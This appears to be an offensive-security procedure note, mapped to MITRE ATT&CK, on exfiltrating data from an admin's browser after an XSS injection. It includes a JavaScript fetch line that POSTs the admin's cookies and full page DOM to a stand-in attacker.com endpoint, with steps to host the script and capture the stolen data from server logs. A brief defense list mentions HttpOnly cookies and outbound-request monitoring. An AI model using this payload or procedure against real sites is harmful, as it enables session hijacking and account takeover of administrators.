---
tags:
  - data-exfiltration
  - javascript
  - cookies
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 16f9a17b-489e-4074-964f-66da719c4b92
created_at: '2025-12-14T17:30:27.344Z'
updated_at: '2025-12-14T17:30:27.344Z'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Archive Collected Data]]'
---
# Exfiltrate-Data-from-Admin-Context

## Summary

This procedure captures data exfiltrated by the executed XSS script from the admin dashboard, including DOM elements, cookies, IP address, and other sensitive information.

## Description

The malicious JS loaded from the attacker's domain runs in the admin's browser context, accessing and sending back privileged data like session cookies, current URL, and client IP via HTTP requests to the attacker's server. This can lead to account takeover or further attacks.

## Requirements

1. Server control over the domain hosting the JS (e.g., attacker.com/js)
2. JS script configured to exfiltrate data (e.g., fetch to attacker endpoint)
3. Monitoring tools for incoming requests (e.g., web server logs)

## Defense

Defensive measures and detection strategies:

- Implement HttpOnly and Secure flags on sensitive cookies to block JS access
- Use referrer policies and monitor for unexpected outbound requests from admin pages
- Deploy endpoint protection to detect anomalous data transmissions

## Objectives

1. Receive executed script's data dump from admin browser
2. Extract sensitive info like cookies and IP for escalation
3. Validate full compromise of admin session

## Instructions

### Step 1: Host Malicious Script

**Context**: Ensure the JS file on your domain sends data back, e.g., via XMLHttpRequest or fetch.

Example JS content:
```javascript
fetch('https://attacker.com/exfil', {method: 'POST', body: JSON.stringify({cookies: document.cookie, ip: '', dom: document.documentElement.outerHTML})});
```
Upload to https://attacker.com/js.

### Step 2: Monitor Exfiltration

**Context**: Watch server logs for incoming data post-trigger.

Use server access logs or tools like tcpdump to capture requests containing exfiltrated payload.

> Expected: POST/GET requests with base64-encoded or JSON data from admin IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Archive Collected Data]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[data-exfiltration]]
- [[cookies]]
